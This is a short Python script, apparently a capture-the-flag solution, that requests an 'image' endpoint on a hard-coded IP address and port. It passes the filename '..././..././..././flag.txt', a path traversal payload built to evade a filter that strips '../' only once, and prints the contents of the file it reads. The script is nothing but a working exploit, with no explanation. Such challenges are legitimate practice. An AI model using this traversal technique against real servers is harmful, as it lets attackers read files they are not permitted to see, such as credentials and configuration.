import requests


url = "http://104.248.142.220:13373/"

# open flag.txt file
flag_file = "..././..././..././flag.txt"
image_url = url + "image"
res = requests.get(image_url, params={"filename": flag_file})
print(res.text)
